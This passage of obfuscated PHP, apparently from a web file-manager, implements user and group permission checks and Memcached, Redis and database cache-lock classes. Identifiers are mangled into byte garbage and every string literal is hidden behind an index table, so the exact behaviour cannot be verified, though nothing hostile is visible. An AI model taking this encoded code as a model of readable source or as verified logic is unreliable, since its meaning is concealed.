USER_ID; if (isset($¹Ğú¾ç©[$¬öÃİ›])) { return $¹Ğú¾ç©[$¬öÃİ›]; } $´şéØ¬ = Model($éêŞì¦Ş[2044])->listData(); $ãÃœ¾öô = array(); foreach ($´şéØ¬ as $…§¼ıíÕ) { if ($…§¼ıíÕ[$éêŞì¦Ş[422]] == 0 && $…§¼ıíÕ[$éêŞì¦Ş[1871]] == $éêŞì¦Ş[98]) { $ãÃœ¾öô[] = $…§¼ıíÕ[$éêŞì¦Ş[408]]; } } $²½šê = $this->userGroupParents($¬öÃİ›); $ö“éÃÉ´ = array($éêŞì¦Ş[420] => SourceModel::TYPE_USER, $éêŞì¦Ş[514] => $¬öÃİ›); if ($²½šê) { $ö“éÃÉ´ = array(array($éêŞì¦Ş[420] => SourceModel::TYPE_USER, $éêŞì¦Ş[514] => $¬öÃİ›), array($éêŞì¦Ş[420] => SourceModel::TYPE_GROUP, $éêŞì¦Ş[514] => array($éêŞì¦Ş[427], $²½šê)), $éêŞì¦Ş[997] => $éêŞì¦Ş[1947]); } $¿œô„ô = $this->field($éêŞì¦Ş[2045])->where($ö“éÃÉ´)->select(); $Î¹‰ ¶ô = array(); $³ğŠéßƒ = array_to_keyvalue_group($¿œô„ô, $éêŞì¦Ş[411]); foreach ($³ğŠéßƒ as $¬˜ùü¡ô => $ÊéÉŸ£•) { $ó‘òİ—‚ = $this->authArrayCheck($ÊéÉŸ£•, $¬öÃİ›); if ($ó‘òİ—‚[$éêŞì¦Ş[423]] > 0) { $Î¹‰ ¶ô[] = $¬˜ùü¡ô . $éêŞì¦Ş[22]; } } if ($²½šê) { $°¡„õŞ = Model($éêŞì¦Ş[531]); foreach ($²½šê as $™’û´Å) { $õö‘÷Š¼ = $°¡„õŞ->getInfo($™’û´Å); if (!$õö‘÷Š¼ || !is_array($õö‘÷Š¼[$éêŞì¦Ş[96]])) { continue; } $Î¹‰ ¶ô[] = $õö‘÷Š¼[$éêŞì¦Ş[96]][$éêŞì¦Ş[411]]; } } $ŒÃÓ–Œ¿ = array(); $ÕĞÃø«Û = $²½šê; $•’×‹Ô¹ = Model($éêŞì¦Ş[1333]); $°¡„õŞ = Model($éêŞì¦Ş[531]); $®îğ«İ = array(); $§€úñâ = array(); $¢Úøİö = array(); $òÇ“øÄ¥ = array(); if ($Î¹‰ ¶ô) { $Ò¸´İ§î = $•’×‹Ô¹->where(array($éêŞì¦Ş[411] => array($éêŞì¦Ş[427], $Î¹‰ ¶ô)))->select(); foreach ($Ò¸´İ§î as $‘‚ğªÓç) { $—ıÌ‡ é = $•’×‹Ô¹->parentLevelArray($‘‚ğªÓç[$éêŞì¦Ş[530]]); $ŒÃÓ–Œ¿ = array_merge($ŒÃÓ–Œ¿, $—ıÌ‡ é); $ÕĞÃø«Û[] = $‘‚ğªÓç[$éêŞì¦Ş[514]]; $®îğ«İ[$‘‚ğªÓç[$éêŞì¦Ş[411]]] = $—ıÌ‡ é; $§€úñâ[$‘‚ğªÓç[$éêŞì¦Ş[411]]] = $‘‚ğªÓç[$éêŞì¦Ş[514]]; } } $ÕĞÃø«Û = array_values(array_unique($ÕĞÃø«Û)); $Şù§Â¸® = $ÕĞÃø«Û; foreach ($Şù§Â¸® as $™’û´Å) { $õö‘÷Š¼ = $°¡„õŞ->getInfo($™’û´Å); $—ıÌ‡ é = $•’×‹Ô¹->parentLevelArray($õö‘÷Š¼[$éêŞì¦Ş[530]]); $ÕĞÃø«Û = array_merge($ÕĞÃø«Û, $—ıÌ‡ é); } $ÕĞÃø«Û = array_values(array_unique($ÕĞÃø«Û)); foreach ($ÕĞÃø«Û as $™’û´Å) { $õö‘÷Š¼ = $°¡„õŞ->getInfo($™’û´Å); $ŒÃÓ–Œ¿[] = $õö‘÷Š¼[$éêŞì¦Ş[96]][$éêŞì¦Ş[411]]; $¢Úøİö[$™’û´Å] = $õö‘÷Š¼[$éêŞì¦Ş[96]][$éêŞì¦Ş[411]]; $òÇ“øÄ¥[$™’û´Å] = $•’×‹Ô¹->parentLevelArray($õö‘÷Š¼[$éêŞì¦Ş[530]]); } foreach ($®îğ«İ as $ ã­±‹Ÿ => $øÕœõÆ) { $—ûÒáˆ = $§€úñâ[$ ã­±‹Ÿ]; if (!$—ûÒáˆ || !$¢Úøİö[$—ûÒáˆ]) { continue; } $‹•Ã³ ® = array(); foreach ($òÇ“øÄ¥[$—ûÒáˆ] as $™’û´Å) { $‹•Ã³ ®[] = $¢Úøİö[$™’û´Å]; } $®îğ«İ[$ ã­±‹Ÿ] = array_merge($‹•Ã³ ®, $øÕœõÆ); } $ŒÃÓ–Œ¿ = array_values(array_unique($ŒÃÓ–Œ¿)); $²©°’Ù€ = array($éêŞì¦Ş[2037] => $ŒÃÓ–Œ¿, $éêŞì¦Ş[2038] => $®îğ«İ); $¹Ğú¾ç©[$¬öÃİ›] = $²©°’Ù€; return $²©°’Ù€; } private function makeSourceAuth($¬üŞÍİİ, $°ë²Æ½¹, $å½¯èÕ× = false) { $Á°²ãïû =& $_SERVER[¹Û¹Æ€]; $³‹²î’ = $Á°²ãïû[98]; $¾º…¢ôÁ = $¬üŞÍİİ[$Á°²ãïû[514]]; $ÄŠç•¨£ = $¬üŞÍİİ[$Á°²ãïû[420]] == SourceModel::TYPE_GROUP; $¯şÒ ’— = $ÄŠç•¨£ ? $this->groupRootAuth($¾º…¢ôÁ, $å½¯èÕ×) : !1; if ($¯şÒ ’— && Model($Á°²ãïû[516])->authCheckAction($¯şÒ ’—[$Á°²ãïû[422]], $Á°²ãïû[1870])) { return $this->groupAuthInfo($¯şÒ ’—, $¾º…¢ôÁ); } $ÄÁÄ²²« = Model($Á°²ãïû[1333])->parentLevelArray($¬üŞÍİİ[$Á°²ãïû[530]]); $ÄÁÄ²²« = array_merge(array($¬üŞÍİİ[$Á°²ãïû[411]]), array_reverse($ÄÁÄ²²«)); $àƒ¾ıµ = !1; foreach ($ÄÁÄ²²« as $Ò³šŒ¦ö) { if (!isset($°ë²Æ½¹[$Ò³šŒ¦ö])) { continue; } $‰”ğ’ô² = $this->authMake($°ë²Æ½¹[$Ò³šŒ¦ö], $å½¯èÕ×); if ($‰”ğ’ô²[$Á°²ãïû[476]]) { $àƒ¾ıµ = $‰”ğ’ô²; break; } } if (!$ÄŠç•¨£) { return $àƒ¾ıµ; } if (!$àƒ¾ıµ && $¯şÒ ’—) { $àƒ¾ıµ = $this->groupAuthInfo($¯şÒ ’—, $¾º…¢ôÁ); } if (!$àƒ¾ıµ) { $­‰˜ÈïË = Model($Á°²ãïû[531])->getInfo($¾º…¢ôÁ); $ÔŞ¹œî¶ = explode($Á°²ãïû[60], trim($­‰˜ÈïË[$Á°²ãïû[530]], $Á°²ãïû[60])); $ÔŞ¹œî¶ = array_reverse($ÔŞ¹œî¶); foreach ($ÔŞ¹œî¶ as $°¿ÈÛÇ) { if ($°¿ÈÛÇ == $Á°²ãïû[207] || $°¿ÈÛÇ == $³‹²î’) { continue; } $ÜƒŠÖ‰ = $this->groupRootAuth($°¿ÈÛÇ, $å½¯èÕ×); if (!$ÜƒŠÖ‰) { continue; } $àƒ¾ıµ = $this->groupAuthInfo($ÜƒŠÖ‰, $°¿ÈÛÇ); break; } } if (!$àƒ¾ıµ || $àƒ¾ıµ[$Á°²ãïû[423]] <= 0) { $Œ¥òê× = $this->authDeepCheck($¬üŞÍİİ[$Á°²ãïû[411]], $å½¯èÕ×); if ($Œ¥òê×) { $àƒ¾ıµ = $Œ¥òê×; } } return $àƒ¾ıµ; } private function userIsRoot($¬´ÉüŸœ = false) { $¸’ı‚Ó¡ =& $_SERVER[¹Û¹Æ€]; if (!$¬´ÉüŸœ && _get($GLOBALS, $¸’ı‚Ó¡[512])) { return !0; } $÷ğ’«Ù = Model($¸’ı‚Ó¡[544])->getInfo($¬´ÉüŸœ); $µ¾ÁÁ²õ = Model($¸’ı‚Ó¡[2046])->listData($÷ğ’«Ù[$¸’ı‚Ó¡[1540]]); if ($µ¾ÁÁ²õ && $µ¾ÁÁ²õ[$¸’ı‚Ó¡[520]][$¸’ı‚Ó¡[2047]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¬† œÄ) { $«’µÉõ– =& $_SERVER[¹Û¹Æ€]; $ÁİğÕ‚Î = Model($«’µÉõ–[1333]); $«Ó“Ğãæ = $ÁİğÕ‚Î->sourceInfo($¬† œÄ); if (!$«Ó“Ğãæ) { return !1; } $ÁİğÕ‚Î->groupPathDisplay($«Ó“Ğãæ); $·ÏªÇ³æ = array($«Ó“Ğãæ); $·ÏªÇ³æ = $ÁİğÕ‚Î->_listAppendPath($·ÏªÇ³æ); $«Ó“Ğãæ = $·ÏªÇ³æ[0]; $æñŞ‰°‰ = $«Ó“Ğãæ[$«’µÉõ–[528]]; if (isset($«Ó“Ğãæ[$«’µÉõ–[536]])) { $ÏÛ×¯­º = explode($«’µÉõ–[18], trim($«Ó“Ğãæ[$«’µÉõ–[528]], $«’µÉõ–[18])); array_shift($ÏÛ×¯­º); $æñŞ‰°‰ = $«Ó“Ğãæ[$«’µÉõ–[534]] . $«’µÉõ–[2048] . implode($«’µÉõ–[18], $ÏÛ×¯­º); } return array($«’µÉõ–[429] => $«Ó“Ğãæ[$«’µÉõ–[42]], $«’µÉõ–[94] => KodIO::make($«Ó“Ğãæ[$«’µÉõ–[411]]), $«’µÉõ–[2049] => $æñŞ‰°‰); } private function groupAuthInfo($¸ÒÏÀ€°, $Ûş´½§) { $Ü©ßø£ =& $_SERVER[¹Û¹Æ€]; $´ü‰Àïß = Model($Ü©ßø£[531])->getInfo($Ûş´½§); return array($Ü©ßø£[2050] => intval($¸ÒÏÀ€°[$Ü©ßø£[422]]), $Ü©ßø£[2034] => $¸ÒÏÀ€°, $Ü©ßø£[2051] => LNG($Ü©ßø£[2052]), $Ü©ßø£[2043] => array($Ü©ßø£[429] => $´ü‰Àïß[$Ü©ßø£[42]], $Ü©ßø£[94] => KodIO::make($´ü‰Àïß[$Ü©ßø£[96]][$Ü©ßø£[411]]), $Ü©ßø£[2049] => $´ü‰Àïß[$Ü©ßø£[535]])); } protected function groupRootAuth($«Öş–Ò, $î¥°¯õŞ = false) { $ÃÜ±èÓŠ =& $_SERVER[¹Û¹Æ€]; $î¥°¯õŞ = $î¥°¯õŞ ? $î¥°¯õŞ : USER_ID; $„ÄËÜîÔ = $î¥°¯õŞ . $ÃÜ±èÓŠ[2053] . $«Öş–Ò; static $£Úğüä¨ = array(); if (isset($£Úğüä¨[$„ÄËÜîÔ])) { return $£Úğüä¨[$„ÄËÜîÔ]; } $ÁìÔ¸Ş = Model($ÃÜ±èÓŠ[531])->getInfo($«Öş–Ò); $Ú¿°ì¿ = $this->userGroupList($î¥°¯õŞ); $Êö®éğ  = isset($Ú¿°ì¿[$«Öş–Ò]) ? $Ú¿°ì¿[$«Öş–Ò][$ÃÜ±èÓŠ[422]] : !1; if ($Êö®éğ  && Model($ÃÜ±èÓŠ[516])->authCheckAction($Êö®éğ [$ÃÜ±èÓŠ[422]], $ÃÜ±èÓŠ[1870])) { $£Úğüä¨[$„ÄËÜîÔ] = $Êö®éğ ; return $Êö®éğ ; } $®öÛ‚øµ = $this->sourceAuthSelect($ÁìÔ¸Ş[$ÃÜ±èÓŠ[96]][$ÃÜ±èÓŠ[411]]); $ì Ó€­… = $®öÛ‚øµ ? $this->authMake($®öÛ‚øµ, $î¥°¯õŞ) : !1; $™üˆ‘’‡ = $ì Ó€­… ? $ì Ó€­…[$ÃÜ±èÓŠ[476]] : !1; $£Úğüä¨[$„ÄËÜîÔ] = $™üˆ‘’‡ ? $™üˆ‘’‡ : $Êö®éğ ; return $£Úğüä¨[$„ÄËÜîÔ]; } public function authOwnerApply($ìöŸòì­) { $œÑéŸşÙ =& $_SERVER[¹Û¹Æ€]; if (empty($ìöŸòì­[$œÑéŸşÙ[422]]) || isset($ìöŸòì­[$œÑéŸşÙ[2054]]) && $ìöŸòì­[$œÑéŸşÙ[2054]]) { return $ìöŸòì­; } if (AuthModel::authCheckRoot($ìöŸòì­[$œÑéŸşÙ[422]][$œÑéŸşÙ[423]])) { return $ìöŸòì­; } $ÏÙğ‹ıº = Model($œÑéŸşÙ[1333])->parentLevelArray($ìöŸòì­[$œÑéŸşÙ[530]]); $ÏÙğ‹ıº = array_merge(array($ìöŸòì­[$œÑéŸşÙ[411]]), array_reverse($ÏÙğ‹ıº)); $¿Îë“ÆÜ = $this->sourceAuthSelect($ÏÙğ‹ıº); $ıõê‘í’ = array(); $Æ¶ìğş€ = array(); foreach ($¿Îë“ÆÜ as $œÀñàÃ => $ÕÍÁÊæó) { $ğ±ãä…‹ = $this->authFolderOwnerUser($ÕÍÁÊæó); $ıõê‘í’[$œÀñàÃ] = $ğ±ãä…‹; $Æ¶ìğş€ = array_merge($Æ¶ìğş€, $ğ±ãä…‹[$œÑéŸşÙ[609]]); if ($ğ±ãä…‹[$œÑéŸşÙ[2055]]) { break; } } if (count($Æ¶ìğş€) == 0) { $Æ¶ìğş€ = $this->authFolderOwnerGroup($ìöŸòì­[$œÑéŸşÙ[514]]); } $Æ¶ìğş€ = array_unique($Æ¶ìğş€); if (AuthModel::authCheckRoot($ìöŸòì­[$œÑéŸşÙ[422]][$œÑéŸşÙ[423]])) { $Æ¶ìğş€[] = USER_ID; } $ìöŸòì­[$œÑéŸşÙ[422]][$œÑéŸşÙ[2056]] = Model($œÑéŸşÙ[522])->userListInfo($Æ¶ìğş€); return $ìöŸòì­; } private function authFolderOwnerGroup($ÂŠå­×Â) { $ª§™¢öï =& $_SERVER[¹Û¹Æ€]; $¦Êğ‚Öñ = Model($ª§™¢öï[1939])->where(array($ª§™¢öï[1849] => $ÂŠå­×Â))->select(); $ªê¾‹Ğš = array(); if (!$¦Êğ‚Öñ) { return $ªê¾‹Ğš; } foreach ($¦Êğ‚Öñ as $Ü²ñîİ¾) { $¶»äµ­Ó = $this->authInfo($Ü²ñîİ¾); if (AuthModel::authCheckRoot($¶»äµ­Ó[$ª§™¢öï[422]])) { $ªê¾‹Ğš[] = $Ü²ñîİ¾[$ª§™¢öï[1659]]; } } return $ªê¾‹Ğš; } private function authFolderOwnerUser($®‡ğÜç) { $„å¼¤‚Ò =& $_SERVER[¹Û¹Æ€]; $¸ˆ“•– = array(); $ßªµ¥õ = !1; foreach ($®‡ğÜç as $Êã½ÇíÛ) { $«¼í†Í = $this->authInfo($Êã½ÇíÛ); if ($Êã½ÇíÛ[$„å¼¤‚Ò[514]] == $„å¼¤‚Ò[207]) { $ßªµ¥õ = !0; } if ($Êã½ÇíÛ[$„å¼¤‚Ò[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($«¼í†Í[$„å¼¤‚Ò[422]])) { $¸ˆ“•–[] = $Êã½ÇíÛ[$„å¼¤‚Ò[514]]; } } } return array($„å¼¤‚Ò[609] => $¸ˆ“•–, $„å¼¤‚Ò[2055] => $ßªµ¥õ); } public function authMake($ïÚş×ô§, $áÎ÷îŒ = false) { $«Àô¹ =& $_SERVER[¹Û¹Æ€]; $êÓôÎ¼ğ = $this->authArrayCheck($ïÚş×ô§, $áÎ÷îŒ); if ($êÓôÎ¼ğ[$«Àô¹[2057]]) { $êÓôÎ¼ğ[$«Àô¹[2057]] = $this->sourceAuthInfo($êÓôÎ¼ğ[$«Àô¹[2057]]); } return $êÓôÎ¼ğ; } public function authArrayCheck($¥ªõ¡€å, $Æ®ö†Â = false) { $“ÑƒÂÅá =& $_SERVER[¹Û¹Æ€]; if (!$¥ªõ¡€å) { return array($“ÑƒÂÅá[423] => 0, $“ÑƒÂÅá[476] => !1); } $Æ®ö†Â = $Æ®ö†Â ? $Æ®ö†Â : USER_ID; $‡ÍÀ•°Ã = 0; $¹¡Íıï¿ = 0; $‰‹ò¼å = 0; $¸¼‡äØ½ = 0; $™¼Åª²ı = 0; $Á°Æ Êí = 0; $¶´ƒû“Ï = 1000; $ğÊ»â£ = 0; $é× ÷ = 0; $‰¼ôÎ© = 0; $¸óèÕÉÂ = 0; $Èı°… = array($“ÑƒÂÅá[411] => 0); foreach ($¥ªõ¡€å as $Èı°…) { $å’™Ï = $this->authInfo($Èı°…); if (!$å’™Ï) { continue; } $¹óÇ›§ = $Èı°…[$“ÑƒÂÅá[514]]; $Á‹Üªç = intval($å’™Ï[$“ÑƒÂÅá[422]]); if ($Èı°…[$“ÑƒÂÅá[420]] == SourceModel::TYPE_USER && $¹óÇ›§ == $Æ®ö†Â) { $‡ÍÀ•°Ã = !0; $‰‹ò¼å = $å’™Ï; $¹¡Íıï¿ = $Á‹Üªç; } else { if ($Èı°…[$“ÑƒÂÅá[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¹óÇ›§, $Æ®ö†Â)) { $¸¼‡äØ½ = !0; $ˆÑª±· = $this->groupStepToUserGroup($¹óÇ›§, $Æ®ö†Â); if ($ˆÑª±· < $¶´ƒû“Ï) { $¶´ƒû“Ï = $ˆÑª±·; $™¼Åª²ı = $Á‹Üªç; $Á°Æ Êí = $å’™Ï; $ğÊ»â£ = $¹óÇ›§; } if ($ˆÑª±· == $¶´ƒû“Ï && $Á‹Üªç >= $™¼Åª²ı) { $™¼Åª²ı = $Á‹Üªç; $Á°Æ Êí = $å’™Ï; $ğÊ»â£ = $¹óÇ›§; } } else { if ($¹óÇ›§ == $“ÑƒÂÅá[207]) { $é× ÷ = !0; $¸óèÕÉÂ = $å’™Ï; $‰¼ôÎ© = $Á‹Üªç; } } } } if ($‡ÍÀ•°Ã) { $ò æ¥ é = $¹¡Íıï¿; $å’™Ï = $‰‹ò¼å; $İÇ‘êÙÕ = LNG($“ÑƒÂÅá[2058]); } else { if ($¸¼‡äØ½) { $ò æ¥ é = $™¼Åª²ı; $å’™Ï = $Á°Æ Êí; $…‡¸³Â¼ = Model($“ÑƒÂÅá[531])->getInfo($ğÊ»â£); $İÇ‘êÙÕ = $“ÑƒÂÅá[172] . $…‡¸³Â¼[$“ÑƒÂÅá[535]] . $“ÑƒÂÅá[2059] . LNG($“ÑƒÂÅá[2060]); } else { if ($é× ÷) { $ò æ¥ é = $‰¼ôÎ©; $å’™Ï = $¸óèÕÉÂ; $İÇ‘êÙÕ = LNG($“ÑƒÂÅá[2031]); } else { $ò æ¥ é = 0; $å’™Ï = !1; $İÇ‘êÙÕ = $“ÑƒÂÅá[22]; } } } $ùœÖÇ¿ = array($“ÑƒÂÅá[2050] => intval($ò æ¥ é), $“ÑƒÂÅá[2034] => $å’™Ï, $“ÑƒÂÅá[2051] => $İÇ‘êÙÕ, $“ÑƒÂÅá[2043] => $Èı°…[$“ÑƒÂÅá[411]]); return $ùœÖÇ¿; } private function groupContainUser($˜Ä”Æİ, $ì£íæìî = false) { return in_array($˜Ä”Æİ, $this->userGroupParents($ì£íæìî)); } private function groupStepToUserGroup($ÒŒ¥ÊÕ¾, $êâ»Ç÷ú = false) { $›ş§ôğ =& $_SERVER[¹Û¹Æ€]; $ìŸö´ŒŸ = $this->userGroupList($êâ»Ç÷ú); $’Ëğß¡è = 1000; $¯»—Õê = $GLOBALS[$›ş§ôğ[16]][$›ş§ôğ[99]][$›ş§ôğ[1952]] == 1; $éêôË°± = $¯»—Õê ? 3 : 2; foreach ($ìŸö´ŒŸ as $ğ®ÚÚëŸ) { if ($ğ®ÚÚëŸ[$›ş§ôğ[1849]] == $ÒŒ¥ÊÕ¾) { return 0; } $ø¹ÕÒÆÌ = explode($›ş§ôğ[60], trim($ğ®ÚÚëŸ[$›ş§ôğ[530]], $›ş§ôğ[60])); if ($ø¹ÕÒÆÌ[0] == $›ş§ôğ[207] && count($ø¹ÕÒÆÌ) > $éêôË°±) { $¦¬ÀåşÜ = array_reverse(array_slice($ø¹ÕÒÆÌ, $éêôË°±)); $´×úÛ¾Ù = array_search($ÒŒ¥ÊÕ¾, $¦¬ÀåşÜ); if ($´×úÛ¾Ù !== !1 && $´×úÛ¾Ù + 1 <= $’Ëğß¡è) { $’Ëğß¡è = $´×úÛ¾Ù + 1; } } } return $’Ëğß¡è; } private function userGroupList($·í¸»«ê = false) { $„ª¹½â =& $_SERVER[¹Û¹Æ€]; static $‘ØòüÈ¢ = array(); if (isset($‘ØòüÈ¢[$·í¸»«ê])) { return $‘ØòüÈ¢[$·í¸»«ê]; } $“Ğ ¥•å = Model($„ª¹½â[544])->getInfo($·í¸»«ê); $‘ØòüÈ¢[$·í¸»«ê] = array_to_keyvalue($“Ğ ¥•å[$„ª¹½â[2032]], $„ª¹½â[1849]); return $‘ØòüÈ¢[$·í¸»«ê]; } public function userGroupParents($ó››¹Ñœ) { $˜úšÅŠ =& $_SERVER[¹Û¹Æ€]; static $êŸ¡ÔÜ = array(); $ó››¹Ñœ = $ó››¹Ñœ ? $ó››¹Ñœ : USER_ID; if (isset($êŸ¡ÔÜ[$ó››¹Ñœ])) { return $êŸ¡ÔÜ[$ó››¹Ñœ]; } $´†áÕ– = $this->userGroupList($ó››¹Ñœ); $¢Äı¨“ = array(); $½´åİ–Ò = $GLOBALS[$˜úšÅŠ[16]][$˜úšÅŠ[99]][$˜úšÅŠ[1952]] == 1; $ç˜ìœŠ = $½´åİ–Ò ? 3 : 2; foreach ($´†áÕ– as $•Î‹Ùºò) { $ªšê¡¡ô = array($•Î‹Ùºò[$˜úšÅŠ[1849]]); $¾Ã×Ş¯ = explode($˜úšÅŠ[60], trim($•Î‹Ùºò[$˜úšÅŠ[530]], $˜úšÅŠ[60])); if ($¾Ã×Ş¯[0] == $˜úšÅŠ[207] && count($¾Ã×Ş¯) > $ç˜ìœŠ) { $…‚ö°î² = array_slice($¾Ã×Ş¯, $ç˜ìœŠ); $ªšê¡¡ô = array_merge($ªšê¡¡ô, array_reverse($…‚ö°î²)); } $¢Äı¨“ = array_merge($¢Äı¨“, $ªšê¡¡ô); } $êŸ¡ÔÜ[$ó››¹Ñœ] = array_unique($¢Äı¨“); return $êŸ¡ÔÜ[$ó››¹Ñœ]; } public function authTargetInfoMake($Íæ¢…ş) { $Ïò­ßŠ =& $_SERVER[¹Û¹Æ€]; $¬ıì»€ = array(); $Öå·ààª = array(); foreach ($Íæ¢…ş as $ î³“) { if ($ î³“[$Ïò­ßŠ[420]] == SourceModel::TYPE_USER) { $¬ıì»€[] = intval($ î³“[$Ïò­ßŠ[514]]); } else { if ($ î³“[$Ïò­ßŠ[420]] == SourceModel::TYPE_GROUP) { $Öå·ààª[] = intval($ î³“[$Ïò­ßŠ[514]]); } } } if ($¬ıì»€) { $¬ıì»€ = Model($Ïò­ßŠ[522])->userListInfo($¬ıì»€); } if ($Öå·ààª) { $ãï£µ¹¬ = array($Ïò­ßŠ[1937] => array($Ïò­ßŠ[427], $Öå·ààª)); $Öå·ààª = Model($Ïò­ßŠ[531])->field($Ïò­ßŠ[2061])->where($ãï£µ¹¬)->select(); $Öå·ààª = array_to_keyvalue($Öå·ààª, $Ïò­ßŠ[1849]); } return array($Ïò­ßŠ[2062] => $¬ıì»€, $Ïò­ßŠ[2063] => $Öå·ààª); } public function authInfo($õåóÕ˜á) { $Ã–Ú®ì– =& $_SERVER[¹Û¹Æ€]; if ($õåóÕ˜á[$Ã–Ú®ì–[1953]]) { $ê÷¥¯œ÷ = Model($Ã–Ú®ì–[516])->listData($õåóÕ˜á[$Ã–Ú®ì–[1953]]); if (!$ê÷¥¯œ÷) { return !1; $÷Ô»¸È¯ = Model($Ã–Ú®ì–[516])->listData(); $¬Šı–Ö = array_filter_by_field($÷Ô»¸È¯, $Ã–Ú®ì–[422], $Ã–Ú®ì–[207]); return $¬Šı–Ö; } $ç–È¦ÜÆ = array_field_key($ê÷¥¯œ÷, array($Ã–Ú®ì–[408], $Ã–Ú®ì–[42], $Ã–Ú®ì–[422], $Ã–Ú®ì–[1872], $Ã–Ú®ì–[1873])); $ç–È¦ÜÆ[$Ã–Ú®ì–[2064]] = $õåóÕ˜á; return $ç–È¦ÜÆ; } else { return array($Ã–Ú®ì–[428] => 0, $Ã–Ú®ì–[1855] => $õåóÕ˜á[$Ã–Ú®ì–[2009]], $Ã–Ú®ì–[429] => $Ã–Ú®ì–[22], $Ã–Ú®ì–[1872] => $Ã–Ú®ì–[2065]); } } } goto C…ÂÈÒêÇ¥; CÁ¢µ«ÆÂÏ: class CacheLockDatabase { public function lock($µ§¦ÁÔ, $¦åå‘¢ = 0) { $—ú¼®Ò = Model($_SERVER[¹Û¹Æ€][827]); $×ÖğÛ¨² = microtime(!0) + $¦åå‘¢; while (microtime(!0) < $×ÖğÛ¨²) { $îº­ŞÚ = $—ú¼®Ò->get($µ§¦ÁÔ); if (!$îº­ŞÚ || $îº­ŞÚ < microtime(!0)) { $†óü“­ò = $—ú¼®Ò->set($µ§¦ÁÔ, $×ÖğÛ¨²); if ($†óü“­ò) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($„ší¹åâ) { return Model($_SERVER[¹Û¹Æ€][827])->get($„ší¹åâ); } public function unlock($™›¡³•) { Model($_SERVER[¹Û¹Æ€][827])->remove($™›¡³•); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¢‚É¿…ë, $¬‘×º§) { $ĞÀÑÕ† =& $_SERVER[¹Û¹Æ€]; if (!class_exists($ĞÀÑÕ†[864])) { show_json($ĞÀÑÕ†[865], !1); } $this->cacheTime = $¬‘×º§; $this->handle = new Memcached(); if (is_array($¢‚É¿…ë[$ĞÀÑÕ†[866]]) && count($¢‚É¿…ë[$ĞÀÑÕ†[866]]) >= 1) { foreach ($¢‚É¿…ë[$ĞÀÑÕ†[866]] as $äŸ ŸÎÍ) { $ŒÉ÷¦Û– = explode($ĞÀÑÕ†[4], $äŸ ŸÎÍ); $this->handle->addServer($ŒÉ÷¦Û–[0], $ŒÉ÷¦Û–[1]); } } else { $this->handle->addServer($¢‚É¿…ë[$ĞÀÑÕ†[191]], $¢‚É¿…ë[$ĞÀÑÕ†[192]]); } } public function set($ñİõû¯Ÿ, $¸ˆÙ‹¼’, $ğÈøŸïı = false) { $ğÈøŸïı = $ğÈøŸïı ? $ğÈøŸïı : $this->cacheTime; return $this->handle->set($ñİõû¯Ÿ, $¸ˆÙ‹¼’, $ğÈøŸïı); } public function get($ÚÈ»ù¾ˆ) { return $this->handle->get($ÚÈ»ù¾ˆ); } public function remove($Ä›·í) { return $this->handle->delete($Ä›·í); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÊÎÊéè, $à”Ì…Àƒ) { $×¡ßì¶ =& $_SERVER[¹Û¹Æ€]; if (!class_exists($×¡ßì¶[867])) { show_json($×¡ßì¶[868], !1); } $this->cacheTime = $à”Ì…Àƒ; $ÁíÏ¬Á­ = isset($ÊÎÊéè[$×¡ßì¶[869]]) ? $ÊÎÊéè[$×¡ßì¶[869]] : 10; $µ·ÌÄ¾ = _get($ÊÎÊéè, $×¡ßì¶[866]); if ($µ·ÌÄ¾ && is_array($µ·ÌÄ¾)) { $this->initCluster($ÊÎÊéè, $ÁíÏ¬Á­); } else { $this->handle = $this->init($ÊÎÊéè, $ÁíÏ¬Á­); } } private function init($ÒÏŸğü›, $¨À¤¦¿ı) { $ğ»Çœ =& $_SERVER[¹Û¹Æ€]; $´‚¯¡‡ƒ = new Redis(); $²¹Ó² = isset($ÒÏŸğü›[$ğ»Çœ[870]]) ? $ÒÏŸğü›[$ğ»Çœ[870]] : !1; if ($²¹Ó²) { $´‚¯¡‡ƒ->pconnect($ÒÏŸğü›[$ğ»Çœ[191]], $ÒÏŸğü›[$ğ»Çœ[192]], $¨À¤¦¿ı); } else { $´‚¯¡‡ƒ->connect($ÒÏŸğü›[$ğ»Çœ[191]], $ÒÏŸğü›[$ğ»Çœ[192]], $¨À¤¦¿ı); } if (!empty($ÒÏŸğü›[$ğ»Çœ[422]])) { $´‚¯¡‡ƒ->auth($ÒÏŸğü›[$ğ»Çœ[422]]); } if (!empty($ÒÏŸğü›[$ğ»Çœ[756]]) && $ÒÏŸğü›[$ğ»Çœ[756]] != 0) { $´‚¯¡‡ƒ->select($ÒÏŸğü›[$ğ»Çœ[756]]); } return $´‚¯¡‡ƒ; } private function initCluster($æ“–¥µĞ, $…Í¸ÛŸæ) { $²êèë´È =& $_SERVER[¹Û¹Æ€]; $×˜Ñ›°ˆ = array($²êèë´È[871], $²êèë´È[872], $²êèë´È[873]); $í÷İ¬Õ = $²êèë´È[871]; if (isset($æ“–¥µĞ[$²êèë´È[26]]) && in_array($æ“–¥µĞ[$²êèë´È[26]], $×˜Ñ›°ˆ)) { $í÷İ¬Õ = $æ“–¥µĞ[$²êèë´È[26]]; } switch ($í÷İ¬Õ) { case $²êèë´È[871]: $this->_slave($æ“–¥µĞ, $…Í¸ÛŸæ); break; case $²êèë´È[872]: break; case $²êèë´È[873]: $this->isCluster = !0; $¡öé ¯Ô = $æ“–¥µĞ[$²êèë´È[866]]; $’ÄÈ‹Øê = isset($æ“–¥µĞ[$²êèë´È[870]]) ? $æ“–¥µĞ[$²êèë´È[870]] : !1; $Û“´·•¸ = isset($æ“–¥µĞ[$²êèë´È[422]]) ? $æ“–¥µĞ[$²êèë´È[422]] : null; $this->handle = new RedisCluster(NUll, $¡öé ¯Ô, $…Í¸ÛŸæ, $…Í¸ÛŸæ, $’ÄÈ‹Øê, $Û“´·•¸); break; default: break; } } private function _slave($‰ìŞˆø’, $Ü•‹æ¦¡) { $ı“‡ø¥ = $‰ìŞˆø’[$_SERVER[¹Û¹Æ€][866]]; $this->filterConfig($‰ìŞˆø’, $ı“‡ø¥[0]); $this->handle = $this->init($‰ìŞˆø’, $Ü•‹æ¦¡); unset($ı“‡ø¥[0]); if (empty($ı“‡ø¥)) { return; } $óÃ·Ş£­ = array_rand($ı“‡ø¥); 